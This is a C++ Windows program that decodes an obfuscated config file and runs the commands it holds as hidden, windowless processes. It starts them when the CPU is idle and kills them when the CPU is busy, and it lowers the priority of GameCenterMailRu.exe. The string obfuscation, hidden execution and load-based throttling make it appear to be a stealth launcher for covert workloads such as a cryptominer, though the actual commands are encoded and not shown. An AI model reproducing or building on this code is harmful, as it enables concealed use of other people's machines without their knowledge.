#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <sstream>
#include <vector>
#include <stack>

//#include <memory>
//#include <future>
//#include <mutex>
#include <thread>
//#include <chrono>
//#include <condition_variable>
//#include <deque>

#include <windows.h>

#include "xstr.hpp"

using namespace std;

FILE* pipe = NULL;

int CPU = 0;
int IDLE = 0;
int BUSY = 0;

int PooID = 0;

bool show_cpu = true;
bool cons = false;

vector<hide::line> Run;
std::stack<DWORD> JOBs;

#define TIMEOUT     10
#define DEADLINE    5 

int THRMAX = 3;

void job (void)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ::ZeroMemory(&si, sizeof si);
    si.cb = sizeof si;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

cout << "Run: " << Run[PooID].c_str() << endl;

    ::CreateProcess(NULL, (LPSTR) Run[PooID].c_str(), NULL, NULL, FALSE, 
              CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    JOBs.push(pi.dwProcessId);

    ::CloseHandle(pi.hThread);
    ::CloseHandle(pi.hProcess);
}
/*
 * ==================
 */
void CALLBACK CPUsage ( HWND wnd , UINT uMsg , UINT Id , DWORD dwTime) { 
static string percent;
static char buff[16];
FILE* wmic = ::popen("wmic cpu get loadpercentage", "r"); 
if(!wmic)
    throw runtime_error("wmic fail");

while( ::fgets(buff, sizeof(buff), wmic)!=NULL) {
    percent = buff;
    if ( isdigit( *percent.begin()) ) break;
}
::pclose(wmic);
istringstream sper(percent);
sper >> CPU;

if (show_cpu) cout << CPU << endl;

if ( ((100 - CPU) > 20) && JOBs.size() < THRMAX ) {
   ++IDLE;  

cout << "IDLE: " << IDLE << endl;

}
else IDLE = 0;

if ((100 - CPU) < 5 && JOBs.size() > 1) {
   ++BUSY;  

cout << "BUSY: " << BUSY << endl;

}
else BUSY = 0;

if (IDLE == TIMEOUT) {
    IDLE = 0;
    job();
    ::popen("wmic process where name=\"GameCenterMailRu.exe\" setpriority=128", "r");

} else 
    if (BUSY == DEADLINE) {
        BUSY = 0;
        stringstream pid("taskkill /PID ");
        pid << JOBs.top();

cout << pid.str() << endl;
        ::popen(pid.str().c_str(), "r");
        JOBs.pop();
   }

}

/*
 * ==================
 */
void Timer (void) {
::SetTimer (NULL, 0, 5000, (TIMERPROC) &CPUsage);

static MSG msg;
while( ::GetMessage(&msg, NULL, 0, 0)) {
    ::TranslateMessage(&msg);
    ::DispatchMessage(&msg);
}
}

/*
 * ======= M A I N =======================
 */
int main (int argc, char** argv
) {
try {

if (argc > 1) {
    string arg(argv[1]);
    if (arg == "qwerty") cons = true;
}

//if (!cons) ::ShowWindow( ::GetConsoleWindow(), SW_HIDE );

static hide::line name("FJUC7Qibj6LAL8FrYUsJ5jbGMpMogbSdwCvpWGB/Jc822zvPVJ2GuVeh");
    name.decode();
    if (cons) cout << name << endl;
    ifstream  ini( name.c_str(), ios::in); 
    if ( !ini.is_open())
        throw runtime_error(name + ": file not open");

static hide::line arg, Args;

while ( getline(ini, arg)) {
    if ( *(arg.begin()) == '#') {
        Args.append(" 2>&1");
        Run.push_back(Args);
        Args.clear();
        continue;
    }
    arg.decode();
    if (cons)
            cout << arg << endl;
    Args.append(arg);
}

if (cons)
    throw runtime_error("^^^ eof");
if ( !Run.size())
    throw runtime_error("never mind");

thread th1(Timer);
th1.detach();

static string console;
while ( getline (cin, console)) {
    cout << console << " what?!" << endl;
}

return 0;

} catch (const exception& e) {
    cerr << e.what() << endl;
    return 1;
}}
